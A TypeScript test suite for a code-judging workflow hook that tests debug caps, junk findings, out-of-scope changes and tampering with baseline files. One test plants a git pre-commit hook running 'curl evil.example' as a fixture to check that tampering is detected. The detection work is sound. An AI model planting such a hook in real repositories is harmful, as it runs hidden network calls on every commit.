import { describe, expect, test } from 'claude-code/testing'
import { flowCheck } from '../hooks/flow-check'
import { SCAN_DIFF_ARGS } from '../hooks/flow-scan'
import { mergeFindings, requiredIds } from '../hooks/flow-judging'
import { redFile } from '../hooks/flow-build'
import { HOME } from './flow-fakes'
import { METHOD_HEAD, ROOT } from './flow-fakes'
import { added, agentRun, atB3, AUTHOR_TREE, duringJudge, editRecord, ended, GREEN_REPORT, HEAD, judgedRuns, lastTicket, latest, NEW_FAILED, OLD, RED_TREE, run, SRC, START, TEST_FILE, toB1, world, diffKey, type DriveOpts } from './flow-drive'

describe('flow-judging: B3, the judge', () => {
  test('all checks hold: the judge is green at the author\'s tree and the feature goes to review', async () => {
    const { w } = await atB3()
    expect(latest(w)).toMatchObject({ task: 'B4', feature: 'F-01', judge: { tree: AUTHOR_TREE, green: true, task: 'B3', f: 'F-01' } })
    expect(latest(w)?.findings).toEqual([])
  })

  test('a failing test: a debug ticket with the failing output and the pack, one debug round used', async () => {
    const { w } = await atB3({ exit: 1, out: 'FAIL tests/add.test.ts > AC-001 adds\nAssertionError: expected 2 to be 3', tests: [OLD, NEW_FAILED] })
    const r = latest(w), t = lastTicket(w)
    expect(r).toMatchObject({ task: 'B3', judge: { green: false, f: 'F-01' } })
    expect(t).toMatchObject({ kind: 'debug', routedType: 'tdd-guide', used: false })
    const text = w.session().value?.tickets[t?.id ?? ''] ?? ''
    expect(text).toContain('## DEBUG F-01')
    expect(text).toContain('AssertionError: expected 2 to be 3')
    expect(text).toContain('F-01: Add numbers')
    expect(text).toContain(`${METHOD_HEAD}\n\n---\nname: debugging-and-error-recovery\n---\nMETHOD debugging-and-error-recovery`)
    expect(text.indexOf(METHOD_HEAD)).toBeGreaterThan(text.indexOf('## PACK'))
    expect(r?.counters[r?.features?.[0]?.key ?? '']?.d).toBe(1)
  })

  test('debug rounds stop at the cap', async () => {
    const { w } = await atB3({ exit: 1, tests: [OLD, NEW_FAILED] })
    for (let i = 0; i < 4; i += 1) {
      await agentRun(w, lastTicket(w)?.id ?? '', ended('REPRODUCE: test\nLOCALIZE: src/add.ts:1\nHYPOTHESIS: x\nFIX: src/add.ts:1-1\nGUARD: AC-001 adds'))
      await flowCheck(w.host)
    }
    expect(latest(w)?.blocked).toEqual({ reason: 'cap', vars: { scope: 'F-01', kind: 'debug' } })
  })

  test('an eval id no passing test proves is red', async () => {
    const { w } = await atB3({ tests: [OLD, { file: 'tests/add.test.ts', title: 'adds well', status: 'passed' }] })
    expect(lastTicket(w)?.kind).toBe('debug')
  })

  test('debug output left in the code is junk: J-1 opens and blocks until fixed or waived', async () => {
    const { w } = await atB3({ src: `${SRC}console.log('here')\n` })
    const r = latest(w)
    expect(r?.findings).toEqual([expect.objectContaining({ id: 'J-1', f: 'F-01', rubricId: 'debug-leftover', status: 'open' })])
    expect(r?.blocked).toMatchObject({ reason: 'junk', vars: { id: 'J-1', rule: 'debug-leftover' } })
    expect(judgedRuns(w)).toBeGreaterThan(0)
  })

  test('a RED test changed by the author is a floor finding', async () => {
    const { w } = await atB3({ test: TEST_FILE.replace('toBe(3)', 'toBe(2)') })
    expect(latest(w)?.blocked).toMatchObject({ reason: 'redTestChanged', vars: { id: 'FL-1', feature: 'F-01', location: 'tests/add.test.ts' } })
  })

  test('fewer tests ran than the baseline plus the new ones is a floor finding; a failing test is not', async () => {
    const { w } = await atB3({ tests: [OLD] })
    expect(latest(w)?.blocked).toMatchObject({ reason: 'floor', vars: { rule: 'fewer-tests', location: '2→1' } })
  })

  test('a change outside the feature\'s Files is a floor finding', async () => {
    const { w } = await atB3({ extra: added('src/other.ts', 'export const x = 1\n') })
    expect(latest(w)?.blocked).toMatchObject({ reason: 'floor', vars: { rule: 'out-of-scope', location: 'src/other.ts' } })
  })

  test('a MEDIUM finding is recorded but does not block', async () => {
    const { w } = await atB3({ src: `${SRC}// const a = 1;\n// const b = 2;\n// const c = 3;\n` })
    expect(latest(w)?.findings).toEqual([expect.objectContaining({ rubricId: 'commented-code', sev: 'MEDIUM', status: 'open' })])
    expect(latest(w)?.task).toBe('B4')
  })

  test('a changed ignored-file set is junk', async () => {
    const { w } = await atB3({ before: d => { (d.gitOut ?? {})['ls-files -o -i --exclude-standard --directory -z'] = 'stash.txt\0' } })
    expect(latest(w)?.blocked).toMatchObject({ reason: 'junk', vars: { rule: 'ignored-set' } })
  })

  test('a RED shape file changed after B1 is tampering', async () => {
    const { w } = await atB3({ before: (_d, x) => { const f = redFile(HOME, latest(x)?.flowId ?? ''); x.files.set(f, (x.files.get(f) ?? '').replace(/"lines":\["[0-9a-f]{16}"/, `"lines":["${'0'.repeat(16)}"`)) } })
    expect(latest(w)?.blocked).toMatchObject({ reason: 'tampered', vars: { file: expect.stringContaining('.red.json') } })
  })

  test('a baseline file changed after S3 is tampering: blocked once, counted once', async () => {
    const { w } = await atB3({ before: (_d, x) => { for (const [k, v] of x.files) if (k.endsWith('.baseline.json')) x.files.set(k, `${v} `) } })
    expect(latest(w)?.blocked).toMatchObject({ reason: 'tampered', vars: { file: expect.stringContaining('.baseline.json') } })
    expect(latest(w)?.selfBlocks).toBe(1)
  })

  test('junk waived while the judge runs does not block (the decision is taken on the newest record)', async () => {
    const { w, d } = await atB3({ src: `${SRC}console.log('here')\n` })
    expect(latest(w)?.blocked?.reason).toBe('junk')
    editRecord(w, r => { const { blocked: _b, ...rest } = r; return rest })
    duringJudge(d, () => editRecord(w, r => ({ ...r, findings: r.findings.map(x => (x.id === 'J-1' ? { ...x, status: 'waived' } : x)) })))
    await flowCheck(w.host)
    expect(latest(w)?.blocked).toBeUndefined()
    expect(latest(w)?.task).toBe('B4')
  })

  test('a baseline changed while the judge runs: blocked, and no green judge is written for that run', async () => {
    const { w } = await atB3({ before: (d, x) => duringJudge(d, () => { for (const [k, v] of x.files) if (k.endsWith('.baseline.json')) x.files.set(k, `${v} `) }) })
    expect(latest(w)?.blocked).toMatchObject({ reason: 'tampered' })
    expect(latest(w)?.task).toBe('B3')
    expect(latest(w)?.judge?.tree === AUTHOR_TREE && latest(w)?.judge?.green).toBeFalsy()
  })

  test('code that reaches the file system forces a security review', async () => {
    const { w } = await atB3({ src: `import { readFileSync } from 'node:fs'\n${SRC}` })
    expect(latest(w)?.frozen['security:F-01']).toBe('forced')
    expect(latest(w)?.task).toBe('B4')
  })

  test('a repository config file changed since setup is tampering, at any flow_check', async () => {
    const d: DriveOpts = { gitOut: { ...HEAD }, judge: { test: { exit: 0, report: GREEN_REPORT } } }
    const w = world(d)
    await toB1(w)
    await run(w, 'flow-build')
    w.files.set(`${ROOT}/.git/hooks/pre-commit`, '#!/bin/sh\ncurl evil.example\n')
    await agentRun(w, lastTicket(w)?.id ?? '', ended('Tests written.'))
    await flowCheck(w.host)
    expect(latest(w)?.blocked).toMatchObject({ reason: 'tampered', vars: { file: expect.stringContaining('.git/hooks/pre-commit') } })
  })
})

describe('flow-judging: pure parts', () => {
  test('required eval ids: the Required criteria of this feature and every earlier one, never an Optional one', () => {
    const plan = {
      acs: [{ id: 'AC-001', required: true, text: '' }, { id: 'AC-002', required: false, text: '' }, { id: 'AC-003', required: true, text: '' }],
      features: [{ id: 'F-01', title: 'a', acs: ['AC-001', 'AC-002'], files: [], security: false }, { id: 'F-02', title: 'b', acs: ['AC-003'], files: [], security: false }],
    }
    expect(requiredIds(plan, plan.features[0] as never)).toEqual(['AC-001'])
    expect(requiredIds(plan, plan.features[1] as never)).toEqual(['AC-001', 'AC-003'])
  })

  test('findings: new ones numbered on, gone ones resolved, a waived one kept as it is', () => {
    const old = [
      { id: 'FL-1', f: 'F-01', rubricId: 'skip-or-only', sev: 'HIGH' as const, loc: 'a:1', status: 'open' },
      { id: 'J-1', f: 'F-01', rubricId: 'debug-leftover', sev: 'HIGH' as const, loc: 'b:2', status: 'waived' },
    ]
    const out = mergeFindings(old, 'F-01', [{ kind: 'J', rule: 'debug-leftover', sev: 'HIGH', loc: 'b:2' }, { kind: 'FL', rule: 'trivial-assert', sev: 'HIGH', loc: 'c:3' }])
    expect(out.map(x => [x.id, x.status])).toEqual([['FL-1', 'resolved'], ['J-1', 'waived'], ['FL-2', 'open']])
    const again = mergeFindings(out, 'F-01', [{ kind: 'FL', rule: 'skip-or-only', sev: 'HIGH', loc: 'a:1' }, { kind: 'J', rule: 'debug-leftover', sev: 'HIGH', loc: 'b:2' }])
    expect(again.map(x => [x.id, x.status])).toEqual([['FL-1', 'open'], ['J-1', 'waived'], ['FL-2', 'resolved']])
  })
})
